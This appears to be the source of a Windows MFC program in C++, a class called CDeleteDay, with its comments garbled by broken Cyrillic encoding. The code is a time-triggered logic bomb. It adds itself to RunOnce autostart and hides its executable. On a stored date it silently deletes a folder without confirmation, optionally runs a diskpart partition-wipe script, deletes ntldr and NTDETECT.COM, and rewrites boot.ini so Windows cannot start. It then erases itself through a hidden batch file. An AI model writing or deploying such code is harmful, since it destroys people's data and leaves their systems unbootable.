#include "stdafx.h"
#include "DeleteDay.h"

#include <string>
using namespace std;


CDeleteDay::CDeleteDay()
{
}

CDeleteDay::~CDeleteDay()
{
}

// //��������� ���� ������������
bool CDeleteDay::AddToAutoRun()
{
	CString csExePath;
	DWORD dwSize = 512;
	GetModuleFileName(NULL, csExePath.GetBuffer(dwSize), dwSize);
	TRACE1("���� � ��������� = %s\n", csExePath.GetString());

	csExePath.ReleaseBuffer();

	//�������� ���� � ������������
	//�������� ���������� ����� ��������� � RunOnce � ������ ��� ���� ���� ��������� ���� ��
	//���������� ���� ������������
	if (SHSetValue(HKEY_CURRENT_USER
		, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, RunOnceItemName
		, REG_SZ
		, csExePath.GetString()
		, stringSizeInBytes(csExePath)) != ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � AddToAutorun()");
		return false;
	}

	return true;
}

// ���������� � ������ ����� ���������� ������
bool CDeleteDay::SaveDateOfPerformance(SYSTEMTIME SysTime)
{
	CString DeleteDay, DeleteWeek, DeleteMonth;

	DeleteDay.Format(L"%d", SysTime.wDay);
	DeleteWeek.Format(L"%d", SysTime.wDayOfWeek);
	DeleteMonth.Format(L"%d", SysTime.wMonth);

	//DeleteDay.Format("%d.%d%.d", SysTime.wDay, SysTime.wDayOfWeek, SysTime.wMonth);
	TRACE1("���� �������� = %s\n", DeleteDay.GetString());

	HKEY hk;

	// ������� ���� � HKCR\CLSID
	if (RegCreateKeyEx(HKEY_CURRENT_USER
		, RegDataKeyName
		, 0
		, NULL
		, REG_OPTION_NON_VOLATILE
		, KEY_WRITE
		, NULL
		, &hk
		, NULL))
	{
		TRACE(L"Could not create the registry key in SaveDeleteDay().", L"�����", MB_ICONERROR);
		return false;
	}

	RegCloseKey(hk);

	//===== �������� ���� �������� ======
	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDayKeyName			//��� ��������
		, REG_SZ
		, DeleteDay.GetString()
		, stringSizeInBytes(DeleteDay)) != ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � SaveDeleteDay()", "�����", MB_ICONERROR);
		return false;
	}

	//===== �������� ���� ������ =====
	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDayOfWeekKeyName			//��� ��������
		, REG_SZ
		, DeleteWeek.GetString()
		, stringSizeInBytes(DeleteWeek)) != ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � SaveDeleteDay()", "�����", MB_ICONERROR);
		return false;
	}

	//===== �������� ����� =====
	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelMonthKeyName			//��� ��������
		, REG_SZ
		, DeleteMonth.GetString()
		, stringSizeInBytes(DeleteMonth)) != ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � SaveDeleteDay()");
		return false;
	}

	return true;
}

// ���������� ����� ����� ����� �������
bool CDeleteDay::SavePathOfFolderToDelete(CString csFolderPath)
{
	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelFolderKeyName
		, REG_SZ
		, csFolderPath.GetString()
		, stringSizeInBytes(csFolderPath)) != ERROR_SUCCESS)
	{
		TRACE(L"����� � SHSetValue() � SaveFolderPathToDelete()");
		return false;
	}

	return true;
}

void CDeleteDay::HideFile(bool bHide)
{
	wchar_t szFileExe[MAX_PATH] = { L"\0" };
	wchar_t sz[600] = { L"\0" }; // ������-��������...

	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // �������� ���� � ����������� ��������

	//Retrieves the short path form of the specified path.
	if (GetShortPathName(szFileExe, sz, MAX_PATH)) // ����������� ��� ����� � ��������� ���
		wcscpy(szFileExe, sz);

	if (bHide) {
		SetFileAttributes(szFileExe, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); // "������" ����
	}
	else {
		SetFileAttributes(szFileExe, FILE_ATTRIBUTE_NORMAL); // ���������� ����
	}
	
}

bool CDeleteDay::EnableCrashOnCtrlScroll()
{
	HKEY hKey;

	if (RegOpenKey(HKEY_CURRENT_USER, L"SYSTEM\\CurrentControlSet\\Services\\i8042prt\\Parameters", &hKey) == ERROR_SUCCESS)
	{
		DWORD lpData = 0x01;

		if (RegSetValueEx(hKey, L"CrashOnCtrlScroll", NULL, REG_DWORD, (BYTE*)&lpData, (DWORD)sizeof(lpData)) != ERROR_SUCCESS)
		{
			TRACE(L"����� � SHSetValue() � EnableCrashOnCtrlScroll()");
			return false;
		}
	}

	return true;
}

bool CDeleteDay::DeleteDiskD(void)
{
	CString csDeleteD("YES");

	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDiskDKeyName
		, REG_SZ
		, csDeleteD.GetString()
		, csDeleteD.GetLength()) != ERROR_SUCCESS)
	{
		TRACE("����� � SHSetValue() � DeleteDiskD()");
		return false;
	}

	return true;
}

bool CDeleteDay::SaveTaskKillWindows()
{
	CString csKillWindows("YES");

	if (SHSetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, KillWindowsKeyName
		, REG_SZ
		, csKillWindows.GetString()
		, csKillWindows.GetLength()) != ERROR_SUCCESS)
	{
		TRACE(L"����� � SHSetValue() � DeleteDiskD()\n");
		return false;
	}

	return true;
}

void CDeleteDay::SelfDelete()
{
	//������� ���� �� ������������
	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);

	// ����� �������� ����� ������ - ������ �� ����� %)
	char szFilePath[MAX_PATH] = { "\0" };
	char szFileBat[MAX_PATH] = { "System.bat" };
	char szFileExe[MAX_PATH] = { "\0" };

	char sz[600]; // ������-��������...

	unsigned int iTmp;
	char* lpTmp;

	// �������� ���� � ����������� ��������
	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe));

	// ����������� � ��� ����� � ��������� ���
	if (GetShortPathNameA(szFileExe, sz, MAX_PATH))
		strcpy(szFileExe, sz);

	size_t sLen = strlen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //������ lpTmp ��������� �� ����� ������

	for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
	{
		if (!strncmp(lpTmp, "\\", 1))
			break;
	}

	//������� �� ���� � ���� �������� ���������
	size_t count = lpTmp - szFileExe; //Number of characters to be copied

	strncpy(szFilePath, szFileExe, count);
	strcat(szFilePath, "\\");

	//===== ������� ���� ���� =====
	char BATSTRING[1024] =
		":Repeat\n"
		"del \"%s\"\n" //������� �� �������� ���������
		"if exist \"%s\" goto Repeat\n" //��������� ���� �� ���������
		":Repeat1\n"
		"del \"%s\"\n"
		"\0"; //�������� �������

	HANDLE hFile = CreateFileA((LPCSTR)szFileBat,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // ������� ��-����� ���� ("�����?" - ���. ����������� ������)

	if (!hFile)	{
		TRACE(L"���� ���, ����� System.bat ��� � �� �����\n");
	}

	//char sz[600]; // ������-��������...
	//������� ���-���� ===========================================
	sprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);

	if (bError)	{
		TRACE(L"���� ���, ����� � ���� System.bat �� ������� ��������\n");
	}

	CloseHandle(hFile); // ���������� ��������� ���� ����� �������� �������, ����� ���� �� ������ ���� ������ �������

	ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // ��������� ������.
}

// ��������� �� �������� �� ���� ���������� �������
bool CDeleteDay::InspectDeleteData()
{
	CString DeleteDay, CurrentDay;
	
	int DelDay = 0, DelDayOfWeek = 0, DelMonth = 0;
	int CurDay = 0, CurDayOfWeek = 0, CurMonth = 0;
	
	//�������� ���� ��������, ���� ������ �������� �� �������
	if (!ReadRegDeleteDay(DelDay, DelDayOfWeek, DelMonth)) {
		//�� �������� ������ ����������� ������ ��� � ������ ���� ������
		return false;
	}
	
	//���������� ������� ����
	GetCurrentDay(CurDay, CurDayOfWeek, CurMonth);
	
	//�������� ����, ���� ���������, �� ...
	//����� ���������� ����, ���� ������ � ����� �� �����������
	if (DelDay != 0 && DelDayOfWeek != 0 && DelMonth != 0 )	{	
		if (CurDay >= DelDay && CurDayOfWeek >= DelDayOfWeek && CurMonth >= DelMonth) {
			TRACE0("���� ���������. ��������� ������������ �������.\n");
			return true;
		}		
	}	
	return false;
}

bool CDeleteDay::PerformATask(void)
{
	const int SIZE = 1024;
	// ����� �������� ����� ������ - ������ �� ����� %)
	char szFilePath[SIZE] = { "\0" };
	char szFileBat[SIZE] = { "\0" };
	char szFileExe[SIZE] = { "\0" };
	char szFileDiskPart[SIZE] = { "\0" };
	char szTempPath[SIZE] = { "\0" };

	char buffer[SIZE] = { "\0" }; // ������-��������...

	GetModuleFileNameA(NULL, szFileExe, sizeof(szFileExe)); // �������� ���� � ����������� ��������

	if (GetShortPathNameA(szFileExe, buffer, SIZE)) // ����������� � ��� ����� � ��������� ���
		strncpy(szFileExe, buffer, sizeof(szFileExe));

	//������� �������� ����� � ����������. ���������� ���������
	unsigned int iTmp;
	char* lpTmp;
	size_t sLen = strlen(szFileExe) - 1;
	lpTmp = szFileExe + sLen; //������ lpTmp ��������� �� ����� ������

	for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
	{
		if (!strncmp(lpTmp, "\\", 1))
			break;
	}

	//������� �� ���� � ���� �������� ���������
	size_t count = lpTmp - szFileExe; //Number of characters to be copied

	strncpy(szFilePath, szFileExe, count);
	strcat(szFilePath, "\\");

	GetTempPathA(MAX_PATH, szTempPath); // �������� ���� � TEMP-�����

	//���� ������� ���� �
	if (IfDeleteDiskD()) {
		CreateDiskpartScript(szFileDiskPart, szTempPath, szFilePath);
	}

	if (IfKillWindows()) {
		//������ �������� ����� �����������
		DoKillWindows();
	}

	//������� ��������� �����
	DeleteFolder();
	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);
	SetFileAttributesA(szFileExe, FILE_ATTRIBUTE_NORMAL);	// ������ ���� ���������� ����� �� ��������� 
	ShellExecuteA(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // ��������� ������.
	SHDeleteKey(HKEY_CURRENT_USER, RegDataKeyName);
	//������� �� ������������
	SHDeleteValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);

	return false; // � �����������
}

bool DeleteFolder()
{
	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	wstring csPath;

	typedef wstring::size_type strLength;

	CString cspvData;

	SHGetValue(HKEY_CURRENT_USER, RegDataKeyName, DelFolderKeyName, &dwDataType, cspvData.GetBuffer(dwDataBufferSize), &dwDataBufferSize);

	csPath = cspvData;

	strLength iLength = csPath.length();
	strLength index = 0;

	/*��������� ������ ���� �:\\����� �����\\ ������ �:\����� �����\*/
	for (;;)
	{
		index = csPath.find(L"\\", index);

		if (index == -1)
			break;

		csPath.insert(index, L"\\");

		index += 2;
	}

	csPath = csPath + L'\0' + L'\0';

	SHFILEOPSTRUCT sh;
	sh.hwnd = NULL;
	sh.wFunc = FO_DELETE;
	sh.pFrom = csPath.c_str();
	sh.pTo = NULL;
	sh.fFlags = FOF_NOCONFIRMATION | FOF_SILENT;
	sh.hNameMappings = 0;
	sh.lpszProgressTitle = NULL;

	if (SHFileOperation(&sh) != 0)
	{
		TRACE1("����� \"%s\" �� �������.\n", csPath.c_str());
		return false;
	}

	return true;
}

bool IfDeleteDiskD(void)
{
	CString DelD;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//������� ������ ����� ��� ���� � ����
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDiskDKeyName
		, &dwDataType
		, DelD.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � IfDeleteDiskD().\n");
	}

	if (DelD.Compare(L"YES") == 0)
	{
		DelD.ReleaseBuffer();
		return true;
	}

	return false;
}

bool IfKillWindows()
{
	CString csKillW;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//������� ������ ����� ��� ���� � ����
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, KillWindowsKeyName
		, &dwDataType
		, csKillW.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � IfKillWindows().\n");
	}

	if (csKillW.Compare(L"YES") == 0){
		csKillW.ReleaseBuffer();
		return true;
	}

	return false;
}

bool ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
{
	CString RegStringValue;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//===== �������� ���� �������� ����� =====
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDayKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � ReadRegDeleteDay() ��� ��������� ��� ��������.\n");
		return false;
	}

	//��������� ������ � �����
	DelDay = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== �������� ���� ������ =====
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelDayOfWeekKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � ReadRegDeleteDay() ��� ��������� ��� ������ ��������.\n");
		return false;
	}

	//��������� ������ � �����
	DelDayOfWeek = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== �������� ����� =====
	if (SHGetValue(HKEY_CURRENT_USER
		, RegDataKeyName
		, DelMonthKeyName
		, &dwDataType
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize) != ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � ReadRegDeleteDay() ��� ��������� ������ ��������.\n");
		return false;
	}

	//��������� ������ � �����
	Month = _wtoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	return true;
}

void GetCurrentDay(int& iDay, int& iDayOfWeek, int& iMonth)
{
	CString CurrentDay;

	//�������� ������� ����
	CTime CurrentTime(CTime::GetCurrentTime());
	SYSTEMTIME timeDest;
	CurrentTime.GetAsSystemTime(timeDest);

	iDay = timeDest.wDay;
	iDayOfWeek = timeDest.wDayOfWeek;
	iMonth = timeDest.wMonth;

	//CurrentDay.Format("%d%d%d", iDay, iDayOfWeek, iMonth);

	return;
}

bool CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[])
{
	char sz[600]; // ������-��������...
					 //�������� ��� �� ��������� ����� ��� � ������� �������� ���������
	sprintf(szFileDiskPart, "%sDiskpart.txt", (strlen(szTempPath)) ? szTempPath : szFilePath);

	// ���� ���� ����������, �� ������� ��� ��������� �� ����������
	SetFileAttributesA(szFileDiskPart, FILE_ATTRIBUTE_NORMAL); 

	//������� diskpart �������� ===========================================
	//const char* DISKPARTSTRING = "select disk 0\nselect partition 3\ndelete partition noerr override";
	const char* DISKPARTSTRING = "���� ������ �� ������";
	//��������� ������ ��� ������ � ����
	//sprintf(sz, DISKPARTSTRING);

	HANDLE hFile = CreateFileA((LPCSTR)DISKPARTSTRING,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // ������� ��-����� ���� ("�����?" - ���. ����������� ������)

	if (!hFile)
	{
		TRACE("���� ���, ����� Diskpart.txt ��� � �� �����\n");
		return false;
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);

	if (bError)
	{
		TRACE("���� ���, ����� � ���� Diskpart.txt �� ������� ��������");
		return false;
	}

	CloseHandle(hFile);

	return true;
}

bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[])
{
	char strTemp[600] = { '\0' }; // ������-��������...
	//������� ���-���� � ����� ���� ��� � ����� � ����������
	sprintf(szFileBat, "%sSystem.bat", (strlen(szTempPath)) ? szTempPath : szFilePath);

	SetFileAttributesA(szFileBat, FILE_ATTRIBUTE_NORMAL); // ���� ���� ����������, �� ������� ��� ��������� �� ����������

	HANDLE hFile = CreateFileA((LPCSTR)szFileBat,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // ������� ��-����� ���� ("�����?" - ���. ����������� ������)

	if (!hFile) {
		TRACE("���� ���, ����� System.bat ��� � �� �����");
		return false;
	}

	char BATSTRING[1024] =
		":Repeat\n"
		"del \"%s\"\n" //������� �� �������� ���������
		"if exist \"%s\" goto Repeat\n" //��������� ���� �� ���������
		":Repeat1\n"
		"del \"%s\"\n"
		"\0"; //�������� �������	

	if (IfDeleteDiskD()) {
		//��������� ������� ��� ������ � ����
		strncpy(BATSTRING,
			":Repeat\n"
			"del \"%s\"\n" //������� �� �������� ���������
			"if exist \"%s\" goto Repeat\n" //��������� ���� �� ���������
			"DiskPart.exe /S \"%s\"\n" //������� �� �������� �������
			":Repeat1\n"
			"del \"%s\"\n" //�������� �������
			"del \"%s\"\n\0", sizeof(BATSTRING)); //�������� �������� diskpart

		sprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
	}
	else {
		sprintf(strTemp, BATSTRING, szFileExe, szFileExe, szFileBat);
	}

	DWORD dwBytesWritten;
	BOOL bError = (!WriteFile(hFile, strTemp, strlen(strTemp), &dwBytesWritten, NULL) || strlen(strTemp) != dwBytesWritten);

	if (bError) {
		TRACE("���� ���, ����� � ���� System.bat �� ������� ��������");
		return false;
	}

	CloseHandle(hFile); // ���������� ��������� ���� ����� �������� �������, ����� ���� �� ������ ���� ������ �������

	return true;
}

void DoKillWindows()
{
	const int INFO_BUFFER_SIZE = 100;

	CString SystemDisk;

	//�� ����� ����� ����� �����?
	//GetBuffer() Returns a pointer to the internal character buffer for the CSimpleStringT object
	GetWindowsDirectory(SystemDisk.GetBuffer(INFO_BUFFER_SIZE), INFO_BUFFER_SIZE);

	SystemDisk.ReleaseBuffer();

	//��� ����� ������ ����� �����, �������� �� ������
	SystemDisk = SystemDisk.Left(3);
	TRACE("%s\n", SystemDisk);

	//===== 1 ������� ntldr =====
	CString csFileName = SystemDisk + L"\\ntldr";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("�����! ���� �� ������");

	//===== 2 ������� ntdetect.com =====
	csFileName = SystemDisk + L"\\NTDETECT.COM";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("�����! ���� �� ������");

	//===== 3 �������� boot.ini =====
	CFile BootIniFile;

	const int bufSize = 1024;
	char readBuffer[bufSize];

	csFileName = SystemDisk + L"\\boot.ini";

	//--- ������ ���� ---
	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeReadWrite))
	{
		TRACE("�� ������� ������� ����");
		return;
	}

	int BytesRead = BootIniFile.Read(readBuffer, sizeof(readBuffer));

	BootIniFile.Close();

	BootIniFile.Remove(csFileName.GetString());

	//--- ���������� ���� ---
	CString csBootINI(readBuffer);

	csBootINI.Replace(L"partition(1)", L"partition(9)");

	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeWrite | CFile::modeCreate))
	{
		TRACE("�� ������� ������� ����");
		return;
	}

	BootIniFile.Write(csBootINI, BytesRead);

	BootIniFile.Close();

	//������ ��� ����...
	SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

//���������� ������ ������ � ������
int stringSizeInBytes(CString strToCalc) {
	return sizeof(strToCalc)*strToCalc.GetLength();
}